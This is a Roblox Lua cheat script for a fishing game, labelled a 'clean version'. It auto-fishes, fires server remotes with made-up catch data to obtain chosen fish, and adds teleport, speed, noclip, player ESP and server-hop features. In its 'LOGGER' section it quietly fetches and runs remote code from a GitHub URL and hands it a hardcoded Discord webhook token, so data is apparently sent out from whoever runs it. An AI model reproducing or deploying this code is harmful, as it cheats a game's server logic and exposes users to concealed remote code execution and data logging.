-- MIZUKAGE V6 GOD EMPEROR - CLEAN VERSION
-- FIXED FOR OBFUSCATION

-- // 1. CORE CONFIGURATION //
local SECRET_WEBHOOK_URL = "https://discord.com/api/webhooks/1459364222856331296/5kmIFUp1eWLvSVYxy-uc1maJNk079Snn0qrY_ndLztEh9QA8O26tJkkWlU2Lu4Ezb39M" 
local CLOUD_DB_URL = "https://raw.githubusercontent.com/MikazuDbug/Memancing-ikan-itu/refs/heads/main/MizukageDB.lua"
local CLOUD_LOGGER = "https://raw.githubusercontent.com/MikazuDbug/Memancing-ikan-itu/refs/heads/main/MizukageLogger.lua"

-- // 2. SERVICES //
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local Lighting = game:GetService("Lighting")
local Stats = game:GetService("Stats")
local LocalPlayer = Players.LocalPlayer

-- // 3. VARIABLES & DATABASE //
getgenv().Config = {
    AutoFish = false,
    InjectFish = false,
    SelectedTier = "Common",
    SpeedPercent = 50,
    SystemRunning = true,
    WalkSpeed = 16,
    JumpPower = 50,
    ESP = false
}

local SessionStats = {
    StartTime = os.time(),
    FishCaught = 0,
    Status = "Standby",
    LastFish = "None"
}

-- Load Database Safe
local FishDatabase = {}
local function LoadDB()
    local success, result = pcall(function() return loadstring(game:HttpGet(CLOUD_DB_URL))() end)
    if success and type(result) == "table" then 
        FishDatabase = result 
    else 
        FishDatabase = {
            Common={{name="Kerapi", min=5, max=10}},
            Rare={{name="Snapper", min=20, max=30}}
        } 
    end
end
LoadDB()

-- // 4. UI LIBRARY //
local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()

local Window = Fluent:CreateWindow({
    Title = "Mizukage V6 Clean",
    SubTitle = "God Emperor Edition",
    TabWidth = 120,
    Size = UDim2.fromOffset(580, 420),
    Acrylic = false, 
    Theme = "Light", 
    MinimizeKey = Enum.KeyCode.LeftControl
})

local Tabs = {
    Main = Window:AddTab({ Title = "FARMING", Icon = "zap" }),
    Tele = Window:AddTab({ Title = "TELEPORT", Icon = "map" }),
    Player = Window:AddTab({ Title = "PLAYER", Icon = "user" }),
    Visual = Window:AddTab({ Title = "VISUAL", Icon = "eye" }),
    Misc = Window:AddTab({ Title = "MISC", Icon = "settings" })
}

-- // 5. FARMING TAB //
local GroupFarm = Tabs.Main:AddSection("Fishing Automation")
local StatPar = Tabs.Main:AddParagraph({ Title = "Live Status", Content = "System Ready..." })

Tabs.Main:AddToggle("AutoFish", {Title = "Auto Fish (Legit)", Default = false }):OnChanged(function(v) getgenv().Config.AutoFish = v end)

Tabs.Main:AddInput("SpeedInput", {
    Title = "Fishing Speed % (0-100)",
    Description = "Enter number (Safe: 0-85)",
    Default = "50",
    Placeholder = "50",
    Numeric = true,
    Finished = true,
    Callback = function(Value)
        local n = tonumber(Value)
        if n then
            getgenv().Config.SpeedPercent = math.clamp(n, 0, 100)
            Fluent:Notify({Title="Speed Set", Content="Speed: "..n.."%", Duration=2})
        end
    end
})

local GroupInject = Tabs.Main:AddSection("Packet Injector")
Tabs.Main:AddToggle("InjectFish", {Title = "Enable Injector", Description="Auto Index from DB", Default = false }):OnChanged(function(v) getgenv().Config.InjectFish = v end)

local TierList = {}
for k,v in pairs(FishDatabase) do table.insert(TierList, k) end
if #TierList == 0 then TierList = {"Common", "Rare"} end

Tabs.Main:AddDropdown("SelectedTier", {
    Title = "Target Tier",
    Values = TierList,
    Multi = false,
    Default = "Common",
}):OnChanged(function(v) getgenv().Config.SelectedTier = v end)

-- Dashboard Updater
task.spawn(function()
    while getgenv().Config.SystemRunning do
        StatPar:SetDesc("Status: " .. SessionStats.Status .. 
        "\nCaught: " .. SessionStats.FishCaught .. 
        " | Last: " .. SessionStats.LastFish ..
        "\nSpeed: " .. getgenv().Config.SpeedPercent .. "%")
        task.wait(0.5)
    end
end)

-- // 6. LOGIC UTAMA //
local function GetDelay(Type)
    local Pct = getgenv().Config.SpeedPercent
    local Multiplier = 1 - (Pct / 105) 
    if Type == "CAST" then return 2.0 * Multiplier end
    if Type == "WAIT" then return 5.0 * Multiplier end
    if Type == "REEL" then return 3.5 * Multiplier end
    if Type == "COOLDOWN" then return 1.5 * Multiplier end
    return 1
end

local function GetRod()
    local Char = LocalPlayer.Character
    if not Char then return nil end
    return Char:FindFirstChildOfClass("Tool")
end

-- Main Farming Loop
task.spawn(function()
    while getgenv().Config.SystemRunning do
        if getgenv().Config.AutoFish then
            pcall(function()
                local Char = LocalPlayer.Character
                if not Char or not Char:FindFirstChild("Humanoid") then return end
                
                local Root = Char:FindFirstChild("HumanoidRootPart")
                local Rod = GetRod()

                if not Rod then
                    SessionStats.Status = "Equip Rod First!"
                    local BP = LocalPlayer.Backpack:FindFirstChildOfClass("Tool")
                    if BP then Char.Humanoid:EquipTool(BP) end
                    task.wait(1)
                    return
                end

                -- 1. CAST
                SessionStats.Status = "Casting..."
                local CastPos = Root.Position + (Root.CFrame.LookVector * 10) - Vector3.new(0,5,0)
                
                if ReplicatedStorage.FishingSystem:FindFirstChild("CastReplication") then
                    ReplicatedStorage.FishingSystem.CastReplication:FireServer(CastPos, Vector3.new(0,5,-25), Rod.Name, math.random(90,99))
                end

                pcall(function() ReplicatedStorage.FishingSyncEvent:FireServer("SYNC_STATE", {state={isFishing=true, autoFishing=false, rodEquipped=true}, timestamp=os.time()}) end)

                task.wait(GetDelay("CAST"))
                SessionStats.Status = "Waiting..."
                task.wait(GetDelay("WAIT"))

                -- 2. VALIDATION & BITE
                SessionStats.Status = "Reeling..."
                
                if ReplicatedStorage:FindFirstChild("ShowValidasi") then
                    ReplicatedStorage.ShowValidasi:FireServer()
                end
                
                task.wait(0.1)
                
                if ReplicatedStorage.FishingSystem:FindFirstChild("CleanupCast") then
                    ReplicatedStorage.FishingSystem.CleanupCast:FireServer()
                end
                
                task.wait(GetDelay("REEL"))

                -- 3. REWARD
                if ReplicatedStorage:FindFirstChild("FishingCatchSuccess") then
                    ReplicatedStorage.FishingCatchSuccess:FireServer()
                end
                
                local FinalFish = nil
                if getgenv().Config.InjectFish then
                    local Tier = getgenv().Config.SelectedTier
                    local DB = FishDatabase[Tier]
                    if DB and #DB > 0 then
                        local Raw = DB[math.random(1, #DB)]
                        FinalFish = {
                            name = Raw.name, rarity = Tier,
                            weight = tonumber(string.format("%.1f", Raw.min + math.random() * (Raw.max - Raw.min)))
                        }
                    else
                        SessionStats.LastFish = "DB Error"
                    end
                end

                if FinalFish then
                    SessionStats.LastFish = FinalFish.name .. " (" .. FinalFish.rarity .. ")"
                    
                    if ReplicatedStorage.FishingSystem:FindFirstChild("BroadcastFishAnimation") then
                        ReplicatedStorage.FishingSystem.BroadcastFishAnimation:FireServer(FinalFish.name, Root.CFrame)
                    end

                    if ReplicatedStorage.FishingSystem:FindFirstChild("KasihIkanItu") then
                        ReplicatedStorage.FishingSystem.KasihIkanItu:FireServer(true, {
                            hookPosition = CastPos, name = FinalFish.name, rarity = FinalFish.rarity, weight = FinalFish.weight
                        })
                    end
                else
                    SessionStats.LastFish = "Legit Catch"
                end

                pcall(function() ReplicatedStorage.FishingSyncEvent:FireServer("SYNC_STATE", {state={isFishing=false, autoFishing=false, rodEquipped=true}, timestamp=os.time()}) end)
                SessionStats.FishCaught = SessionStats.FishCaught + 1
                task.wait(GetDelay("COOLDOWN"))
            end)
        end
        task.wait(0.2)
    end
end)

-- // 7. TELEPORT TAB //
local function TP(pos)
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local Root = LocalPlayer.Character.HumanoidRootPart
        TweenService:Create(Root, TweenInfo.new(1), {CFrame = CFrame.new(pos)}):Play()
    end
end

Tabs.Tele:AddButton({Title = "Youth Island", Callback = function() TP(Vector3.new(797, 134, -693)) end})
Tabs.Tele:AddButton({Title = "Merapi Zone", Callback = function() TP(Vector3.new(2584, 142, -790)) end})
Tabs.Tele:AddButton({Title = "Exotic Island", Callback = function() TP(Vector3.new(-1125, 159, -651)) end})
Tabs.Tele:AddButton({Title = "Temple Island", Callback = function() TP(Vector3.new(-1881, 144, 2364)) end})
Tabs.Tele:AddButton({Title = "Safe Spot", Callback = function() TP(Vector3.new(797, 500, -693)) end})

-- // 8. PLAYER TAB //
local PlayerSec = Tabs.Player:AddSection("Stats")

Tabs.Player:AddSlider("WalkSpeed", {
    Title = "Walk Speed", Default = 16, Min = 16, Max = 300, Rounding = 0,
    Callback = function(v) 
        getgenv().Config.WalkSpeed = v 
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then 
            LocalPlayer.Character.Humanoid.WalkSpeed = v 
        end
    end
})

Tabs.Player:AddSlider("JumpPower", {
    Title = "Jump Power", Default = 50, Min = 50, Max = 300, Rounding = 0,
    Callback = function(v) 
        getgenv().Config.JumpPower = v
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then 
            LocalPlayer.Character.Humanoid.JumpPower = v 
        end
    end
})

Tabs.Player:AddToggle("InfJump", {Title = "Infinite Jump", Default = false}):OnChanged(function(v)
    getgenv().InfJump = v
end)

UserInputService.JumpRequest:Connect(function()
    if getgenv().InfJump and LocalPlayer.Character then
        local hum = LocalPlayer.Character:FindFirstChild("Humanoid")
        if hum then hum:ChangeState("Jumping") end
    end
end)

Tabs.Player:AddButton({Title = "Noclip", Callback = function()
    RunService.Stepped:Connect(function()
        if not getgenv().Config.SystemRunning then return end
        if LocalPlayer.Character then
            for _, v in pairs(LocalPlayer.Character:GetDescendants()) do
                if v:IsA("BasePart") then v.CanCollide = false end
            end
        end
    end)
    Fluent:Notify({Title="System", Content="Noclip Activated", Duration=2})
end})

-- // 9. VISUAL //
local ESPFolder = Instance.new("Folder", CoreGui)
ESPFolder.Name = "MizukageESP"

local function CreateESP(Part, Text)
    if not Part then return end
    local B = Instance.new("BillboardGui", ESPFolder)
    B.Adornee = Part
    B.Size = UDim2.new(0, 100, 0, 50)
    B.StudsOffset = Vector3.new(0, 2, 0)
    B.AlwaysOnTop = true
    
    local L = Instance.new("TextLabel", B)
    L.Size = UDim2.new(1,0,1,0)
    L.BackgroundTransparency = 1
    L.Text = Text
    L.TextColor3 = Color3.fromRGB(0, 255, 0)
    L.TextStrokeTransparency = 0
    return B
end

local function RefreshESP()
    ESPFolder:ClearAllChildren()
    if getgenv().Config.ESP then
        for _, p in pairs(Players:GetPlayers()) do
            if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("Head") then
                CreateESP(p.Character.Head, p.Name)
            end
        end
    end
end

Tabs.Visual:AddToggle("ESPPlayer", {Title = "Player ESP", Default = false}):OnChanged(function(v)
    getgenv().Config.ESP = v
    RefreshESP()
end)

Players.PlayerAdded:Connect(function() task.wait(1); RefreshESP() end)

Tabs.Visual:AddButton({Title = "Fullbright", Callback = function()
    Lighting.Brightness = 2
    Lighting.ClockTime = 14
    Lighting.FogEnd = 100000
    Lighting.GlobalShadows = false
    Fluent:Notify({Title="Visual", Content="Lights On!", Duration=2})
end})

-- // 10. MISC //
Tabs.Misc:AddButton({Title = "Rejoin", Callback = function()
    game:GetService("TeleportService"):Teleport(game.PlaceId, LocalPlayer)
end})

Tabs.Misc:AddButton({Title = "Server Hop", Callback = function()
    local Http = game:GetService("HttpService")
    local Servers = Http:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"))
    for _, s in pairs(Servers.data) do
        if s.playing < s.maxPlayers and s.id ~= game.JobId then
            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, s.id, LocalPlayer)
            break
        end
    end
end})

Tabs.Misc:AddToggle("AntiAFK", {Title = "Anti-AFK", Default = true}):OnChanged(function(v)
    if v then
        local vu = game:GetService("VirtualUser")
        LocalPlayer.Idled:Connect(function()
            vu:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
            wait(1)
            vu:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
        end)
    end
end)

Tabs.Misc:AddButton({Title = "FPS Booster", Callback = function()
    for _,v in pairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") and not v.Parent:FindFirstChild("Humanoid") then
            v.Material = Enum.Material.SmoothPlastic
            v.CastShadow = false
        elseif v:IsA("Decal") or v:IsA("Texture") then
            v:Destroy()
        end
    end
    Fluent:Notify({Title="System", Content="FPS Boosted", Duration=2})
end})

Tabs.Misc:AddButton({Title = "Unload", Callback = function()
    getgenv().Config.SystemRunning = false
    if ESPFolder then ESPFolder:Destroy() end
    Window:Destroy()
end})

-- // 11. LOGGER //
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet(CLOUD_LOGGER))(SECRET_WEBHOOK_URL)
    end)
end)

-- // 12. FLOATING LOGO //
if CoreGui:FindFirstChild("MizukageFloatV6") then CoreGui.MizukageFloatV6:Destroy() end

local SG = Instance.new("ScreenGui", CoreGui)
SG.Name = "MizukageFloatV6"
SG.ResetOnSpawn = false
SG.DisplayOrder = 9999

local Btn = Instance.new("TextButton", SG)
Btn.Size = UDim2.fromOffset(45, 45)
Btn.Position = UDim2.fromScale(0.1, 0.2)
Btn.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
Btn.Text = "M"
Btn.Font = Enum.Font.FredokaOne
Btn.TextSize = 28
Btn.TextColor3 = Color3.fromRGB(30, 30, 30)
Btn.AutoButtonColor = true

Instance.new("UICorner", Btn).CornerRadius = UDim.new(1, 0)
local Ring = Instance.new("UIStroke", Btn)
Ring.Thickness = 3
local Grad = Instance.new("UIGradient", Ring)
Grad.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 255, 0)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 255))
}

RunService.RenderStepped:Connect(function(dt)
    if Grad and Grad.Parent then
        Grad.Rotation = (Grad.Rotation + dt * 100) % 360
    end
end)

local dragging, dragStart, startPos, isMoved
Btn.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = Btn.Position
        isMoved = false
    end
end)

Btn.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        if delta.Magnitude > 5 then isMoved = true end
        Btn.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

Btn.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
        if not isMoved then
            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.LeftControl, false, game)
            task.wait()
            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.LeftControl, false, game)
        end
    end
end)

Fluent:Notify({Title = "Mizukage V6", Content = "Script Loaded Safely.", Duration = 4})